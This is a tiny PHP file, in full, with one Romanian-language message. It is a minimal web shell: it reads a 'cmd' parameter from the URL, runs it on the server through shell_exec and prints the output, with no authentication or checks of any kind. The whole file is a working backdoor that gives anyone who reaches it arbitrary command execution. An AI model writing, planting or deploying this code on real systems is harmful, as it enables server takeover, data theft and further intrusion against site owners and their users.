<?php


$cmd = $_GET['cmd'] ?? '';

if ($cmd !== '') {
    
    $output = shell_exec($cmd);

    
    echo "<pre>" . $cmd . ": " . $output . "</pre>";

} else {
    echo "<p>Nicio comanda.</p>";
}